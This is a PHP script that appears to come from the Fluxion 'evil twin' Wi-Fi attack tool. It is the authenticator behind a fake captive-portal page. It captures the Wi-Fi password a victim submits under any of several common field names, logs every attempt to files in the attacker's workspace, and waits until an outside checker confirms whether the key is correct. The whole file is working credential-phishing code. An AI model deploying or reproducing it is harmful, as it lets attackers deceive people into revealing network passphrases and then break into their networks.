<?php
	// Receive get & post data and store to variables
	$candidateKeyFields = array("password", "password1", "passphrase", "key", "key1", "wpa", "wpa_psw");
	$key = false;

	foreach ($candidateKeyFields as $candidateKeyField) {
		if (array_key_exists($candidateKeyField, $_POST)) {
			$key = $_POST[$candidateKeyField]; break;
		}
	}

	# The following represents the authenticator result.
	# By default, we assume the password is incorrect.
	# Notice: This variable is used by files including
	# this script, and by the authenticator itself below.
	$candidate_code = 0;

	# If the key wasn't sent with the post request,
	# don't even bother starting the authenticator.
	if (!$key) return 1;

	// Update hit attempts
	$page_hits_log_path = ("$FLUXIONWorkspacePath/hit.txt");
	$page_hits = file($page_hits_log_path)[0] + 1;
	$page_hits_log = fopen($page_hits_log_path, "w");
	fputs($page_hits_log, $page_hits);
	fclose($page_hits_log);

	// Prepare candidate and attempt passwords files' locations.
	$attempt_log_path = "$FLUXIONWorkspacePath/pwdattempt.txt";
	$candidate_path = "$FLUXIONWorkspacePath/candidate.txt";

	$attempt_log = fopen($attempt_log_path, "w");
	fwrite($attempt_log, $key);
	fwrite($attempt_log, "\n");
	fclose($attempt_log);

	# Write candidate key to file to prep for checking.
	$candidate = fopen($candidate_path, "w");
	fwrite($candidate, $key);
	fwrite($candidate, "\n");
	fclose($candidate);

	$candidate_result_path = "$FLUXIONWorkspacePath/candidate_result.txt";

	# Create candidate result file to trigger checking.
	$candidate_result = fopen($candidate_result_path, "w");
	fwrite($candidate_result,"\n");
	fclose($candidate_result);

	do {
		sleep(1);
		$candidate_code = trim(file_get_contents($candidate_result_path));
	} while (!ctype_digit($candidate_code));

	# Reset file by deleting it.
	unlink($candidate_result_path);
?>
